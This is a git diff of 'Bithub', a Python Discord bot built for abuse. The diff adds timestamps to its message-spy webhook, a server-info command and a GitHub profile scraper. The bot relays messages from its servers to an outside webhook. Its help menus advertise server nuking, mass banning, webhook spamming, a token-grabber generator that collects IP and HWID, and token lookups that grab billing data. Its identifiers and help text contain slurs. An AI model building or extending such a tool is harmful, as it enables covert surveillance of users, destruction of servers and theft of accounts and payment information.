@@ -1,4 +1,5 @@
 import discord
+import datetime
 import aiohttp
 import asyncio
 import requests
@@ -15,13 +16,14 @@ from discord.ext import commands
 
 
 
-# ================                 Bithub                   ================ # 
-# ++++++++++++++++          started at 10/17/2023           ++++++++++++++++ #
+# ================                Bithub v0.02              ================ # 
+# ++++++++++++++++               S. 10/17/2023              ++++++++++++++++ #
 
 
                 # ================ changelog ================ # 
+                # added github profile info 
                 # everything looks better now
-                # added message spy with webhooks
+                # added message spy with full webhook support
                 # added tokeninformation
                 # flush will now delete channels before spamming
                 # added tokeninfo.py
@@ -45,7 +47,7 @@ from discord.ext import commands
 
 
 
-YOURUSERID = ''
+YOURUSERID = '992952207588720730'
 
 
 intents = discord.Intents.all()
@@ -93,15 +95,9 @@ leavespy = "OFF"
 editspy = "OFF"
 
 
-def get_webhook_id(url):
-    parts = url.split('/')
-    return int(parts[-3]) if parts[-2] == 'webhooks' else None
 
 
-def is_same_channel(message, webhook_channel_id):
-    return message.channel.id == webhook_channel_id if webhook_channel_id else False
 
-        
 @bot.event
 async def on_message(message):
     await bot.process_commands(message)
@@ -112,41 +108,44 @@ async def on_message(message):
         if message.channel.name == "spy":
             return
 
-        
-
         embed = discord.Embed(
-            title='👁️  Message detected',
+            title='👁️ Message detected',
             description='',
             color=discord.Color.dark_purple()
         )
 
-        embed.add_field(name='⌨️  Content', value=f"**{message.content}**", inline=False)
-        embed.add_field(name='📖  Author', value=f"@{message.author}", inline=False)
-        embed.add_field(name='🔗  Channel', value=f"#{message.channel.name}", inline=False)
-        embed.add_field(name='🏫  Server', value=message.guild.name, inline=False)
-        embed.add_field(name='🆔  Message ID', value=message.id, inline=False)
+         
+        current_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        embed.add_field(name='📃 Content', value=f"{message.content}", inline=True)
+        embed.add_field(name='✒️ Author', value=f"@{message.author}", inline=True)
+        embed.add_field(name='🔗 Channel', value=f"#{message.channel.name}", inline=True)
+        embed.add_field(name='🏫 Server', value=message.guild.name, inline=True)
+        embed.add_field(name='🆔 Message ID', value=message.id, inline=True)
+        embed.add_field(name='📅 Date [Y-M-D]', value=current_date, inline=True)
 
-       
+        # Check if the message is replying to another message   
         if message.reference and message.reference.message_id:
             replied_message = await message.channel.fetch_message(message.reference.message_id)
             if replied_message:
-                embed.add_field(name='↩️  Replying to', value=f'"{replied_message.content}" — @{replied_message.author}', inline=False)
+                embed.add_field(name='↩️ Replying to', value=f'"{replied_message.content}" — @{replied_message.author}', inline=True)
             else:
-                embed.add_field(name='↩️  Replying to', value='Message not found', inline=False)
+                embed.add_field(name='↩️ Replying to', value='Message not found', inline=True)
         else:
-            embed.add_field(name='↩️  Replying to', value='None', inline=False)
+            embed.add_field(name='↩️ Replying to', value='None', inline=True)
 
+
+       
         embed.set_footer(text="🐈‍⬛ signed by xolo")
 
         payload = {
             'embeds': [embed.to_dict()]
         }
 
-       
+        # Send payload to the webhook
         async with aiohttp.ClientSession() as session:
             async with session.post(fuckingwebhook, json=payload):
                 pass
-
         
 
 @bot.event
@@ -160,10 +159,10 @@ async def on_audit_log_entry_create(entry):
         actionxd = str(entry.action).replace("AuditLogAction.", "")
 
         embed = discord.Embed(title='👁️ Audit Log Entry Created', color=discord.Color.green())
-        embed.add_field(name='👊 Action', value=actionxd, inline=False)
-        embed.add_field(name='🪪 User', value=f"@{str(entry.user)}", inline=False)
-        embed.add_field(name='🎯 Target', value=str(entry.target), inline=False)
-        embed.add_field(name='❓ Reason', value=str(entry.reason), inline=False)
+        embed.add_field(name='👊 Action', value=actionxd, inline=True)
+        embed.add_field(name='🪪 User', value=f"@{str(entry.user)}", inline=True)
+        embed.add_field(name='🎯 Target', value=str(entry.target), inline=True)
+        embed.add_field(name='❓ Reason', value=str(entry.reason), inline=True)
         embed.set_footer(text="Audit log spy is limited to this current server. ")
 
         await channel.send(embed=embed)
@@ -193,10 +192,10 @@ async def on_member_update(before, after):
         afterdis = after.display_name
 
         embed = discord.Embed(title="👁️ Profile change detected", description="Profile change detected.", color=discord.Color.dark_green())
-        embed.add_field(name="⬅️ Username before:", value=f"{userbefore}", inline=False)
-        embed.add_field(name="➡️ Username after:", value=f"{userafter}", inline=False)
-        embed.add_field(name="⬅️ Display name before:", value=f"{beforedis}", inline=False)
-        embed.add_field(name="➡️ Display name after:", value=f"{afterdis}", inline=False)
+        embed.add_field(name="⬅️ Username before:", value=f"{userbefore}", inline=True)
+        embed.add_field(name="➡️ Username after:", value=f"{userafter}", inline=True)
+        embed.add_field(name="⬅️ Display name before:", value=f"{beforedis}", inline=True)
+        embed.add_field(name="➡️ Display name after:", value=f"{afterdis}", inline=True)
 
         
         embedtwo = discord.Embed(title="⬅️ Avatar before:", description="", color=discord.Color.dark_green())
@@ -241,9 +240,9 @@ async def on_message_delete(message):
 
     if deletespy != "OFF":
         embed = discord.Embed(title="👁️ Message deleted", description="", color=discord.Color.dark_teal())
-        embed.add_field(name="📜 Message content:", value=f"**{content}**", inline=False)
-        embed.add_field(name="✒️ Message author:", value=f"@{author}", inline=False)
-        embed.add_field(name="🔗 Channel where message was deleted: ", value=f"#{channelx}", inline=False)
+        embed.add_field(name="📜 Message content:", value=f"**{content}**", inline=True)
+        embed.add_field(name="✒️ Message author:", value=f"@{author}", inline=True)
+        embed.add_field(name="🔗 Channel where message was deleted: ", value=f"#{channelx}", inline=True)
         embed.set_footer(text="Delete spy is limited to this current server. ")
         
 
@@ -556,10 +555,10 @@ async def purge(ctx, server_id):
 
 @bot.command()
 async def help(ctx):
-    help_embed = discord.Embed(title='Bithub V0.1 <:bithubwrld:1168918019695706142>', description="", color=discord.Color.orange())
-    help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
+    help_embed = discord.Embed(title='Bithub V0.2 <:clashroyale:1169203519895638097>', description="", color=discord.Color.orange())
+    help_embed.set_footer(text="Github: x9o | Started - 10/17/2023")
     view = XOLOVIEW()
-    view.add_item(discord.ui.Button(label="My Github",style=discord.ButtonStyle.link,url="https://github.com/x9o"))
+    view.add_item(discord.ui.Button(label="🐈‍⬛",style=discord.ButtonStyle.link,url="https://github.com/x9o"))
     await ctx.reply(embed=help_embed, view=view)
 
 @bot.command()
@@ -578,6 +577,22 @@ async def link(ctx):
     await ctx.message.add_reaction("✔️")
 
     await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")
+
+
+
+@bot.command()
+async def servinfo(ctx):
+    guild = ctx.guild
+
+    embed = discord.Embed(title=f"🏫 {guild.name}", color=discord.Color.blue())
+    embed.add_field(name="🆔 Server ID", value=guild.id, inline=False)
+    embed.add_field(name="👶 Owner", value=f"@{guild.owner}", inline=False)
+    embed.add_field(name="🔢 Member Count", value=guild.member_count, inline=False)
+    embed.add_field(name="📅 Created At", value=guild.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=True)
+
+    await ctx.send(embed=embed)
+
+
 
 
 @bot.command()
@@ -824,6 +839,49 @@ async def tokinfo(ctx, token):
         await ctx.reply(embed=embaed)
         print(e)
     
+
+
+@bot.command()
+async def github(ctx, user):
+    response = requests.get(f"https://api.github.com/users/{user}")
+
+    if response.status_code == 200:
+        profile_data = response.json()
+        name = profile_data['name']
+        bio = profile_data['bio']
+        followers = profile_data['followers']
+        following = profile_data['following']
+        avatar_url = profile_data['avatar_url']
+
+        repo_response = requests.get(f"https://api.github.com/users/{user}/repos")
+
+        if repo_response.status_code == 200:
+            repo_data = repo_response.json()
+            x = user
+
+            helpembed = discord.Embed(title=f'{x} - Github', color=discord.Color.green())
+            helpembed.set_thumbnail(url=avatar_url)
+            helpembed.add_field(name='📛 Name', value=f'{name}', inline=False)
+            helpembed.add_field(name='💬 Bio', value=f'{bio}', inline=False)
+            helpembed.add_field(name=':baby: Followers', value=f'[{followers}](https://github.com/{x}?tab=followers)', inline=False)
+            helpembed.add_field(name='🥸 Following', value=f'[{following}](https://github.com/{x}?tab=following)', inline=False)
+            helpembed.add_field(name='📖 Public repositories:', value='', inline=False)
+            helpembed.set_footer(text="Github: x9o")
+
+            for repo in repo_data:
+                repo_name = repo['name']
+                repo_url = repo['html_url']
+                stars = repo['stargazers_count']  # Number of stars
+                forks = repo['forks_count']  
+                helpembed.add_field(name=repo_name, value=f'⭐ Stars: {stars}\n🍴 Forks: {forks}\n{repo_url}', inline=False)
+
+            await ctx.reply(embed=helpembed)
+        else:
+            await ctx.reply("Failed to retrieve repository information.")
+    else:
+        await ctx.reply("Failed to retrieve profile information.")
+
+
 #                                  non bot functions                                      #
 
 #=========================================================================================#
@@ -883,7 +941,7 @@ def webhookfuck(WebHook, Message):
 
 class XOLOVIEW(discord.ui.View):
     @discord.ui.button(label="☢️",
-                       style=discord.ButtonStyle.danger)
+                       style=discord.ButtonStyle.grey)
     async def nig(self, interaction: discord.Interaction, button: discord.ui.Button):
         help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
         help_embed.add_field(name='💣 Flush', value=f'Nukes server\n`{bot.command_prefix}flush <serverid>`', inline=False)
@@ -893,16 +951,17 @@ class XOLOVIEW(discord.ui.View):
         help_embed.add_field(name='🧹 Clear Channel', value=f'Deletes all messages in a channel\n`{bot.command_prefix}clearchannel <serverid> <channelid>`', inline=False)
         help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value=f'`{bot.command_prefix}rolepurge <serverid>`', inline=False)
         help_embed.add_field(name='🔴 Mass Ban [Broken]', value=f'`{bot.command_prefix}massban <serverid>`', inline=False)
-        help_embed.set_footer(text="Made by xolo")
+        help_embed.set_footer(text="Github: x9o")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
 
     @discord.ui.button(label="🛠️",
-                       style=discord.ButtonStyle.green)
+                       style=discord.ButtonStyle.grey)
     async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
         helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
         helpembed.add_field(name='👟 Leave', value=f'Leaves the server\n`{bot.command_prefix}leave <serverid>`', inline=False)
         helpembed.add_field(name='🔗 Link', value=f'Bot Invite link\n`{bot.command_prefix}link`', inline=False)
+        helpembed.add_field(name='🏫 Server Info', value=f"When you can't get the server ID for some reason.\n`{bot.command_prefix}servinfo`", inline=False)
         helpembed.add_field(name='📃 Server List', value=f'Shows a list of servers the bot is in for you to nuke.\n`{bot.command_prefix}servlist`', inline=False)
         helpembed.add_field(name='🧼 Clear', value=f'Deletes all messages sent by the bot\n`{bot.command_prefix}clear <serverid>`', inline=False)
         helpembed.add_field(name='❗ Set Prefix', value=f'Owner only\n`{bot.command_prefix}setprefix <prefix>`', inline=False)
@@ -912,12 +971,12 @@ class XOLOVIEW(discord.ui.View):
         helpembed.add_field(name='⚒️ UnBan', value=f'`{bot.command_prefix}unban <userid>`', inline=False)
         helpembed.add_field(name='🥷 DM', value=f'DM someone\n`{bot.command_prefix}dm <userid> <msgcontent>`', inline=False)
         helpembed.add_field(name=':baby: Avatar', value=f'Check the avatar sum nigga\n`{bot.command_prefix}avatar <user>`', inline=False)
-        helpembed.set_footer(text="Made by xolo")
+        helpembed.set_footer(text="Github: x9o")
 
         await interaction.response.send_message(embed=helpembed, ephemeral=True)
 
     @discord.ui.button(label="👁️",
-                       style=discord.ButtonStyle.secondary)
+                       style=discord.ButtonStyle.grey)
     async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
         global messagespy
         global auditlogspy
@@ -934,22 +993,32 @@ class XOLOVIEW(discord.ui.View):
         helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[{bot.command_prefix}leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
         helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[{bot.command_prefix}deletespytoggle]\nStatus: {deletespy} ', inline=False)
         helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[{bot.command_prefix}editspytoggle]\nStatus: {editspy} ', inline=False)
-        helpxembed.set_footer(text="Made by xolo")
+        helpxembed.set_footer(text="Github: x9o")
 
 
         await interaction.response.send_message(embed=helpxembed, ephemeral=True)
 
 
     @discord.ui.button(label="😈",
-                       style=discord.ButtonStyle.blurple)
+                       style=discord.ButtonStyle.grey)
     async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
         help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
         help_embed.add_field(name='🪝 Webhook Spammer', value=f'Spams a webhook until it gets rate limited asf\n`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
         help_embed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
         help_embed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
-        help_embed.set_footer(text="Made by xolo")
+        help_embed.set_footer(text="Github: x9o")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
+
+
+    @discord.ui.button(label="🪪",
+                       style=discord.ButtonStyle.grey)
+    async def nigxr(self, interaction: discord.Interaction, button: discord.ui.Button):
+        xembed = discord.Embed(title='Profile scraper', color=discord.Color.dark_blue())
+        xembed.add_field(name='<:github:1168890688943968256> Github', value=f'Returns information of a github user\n`{bot.command_prefix}github <targetusername>`', inline=False)
+        xembed.set_footer(text="Github: x9o")
+
+        await interaction.response.send_message(embed=xembed, ephemeral=True)
 
 
         
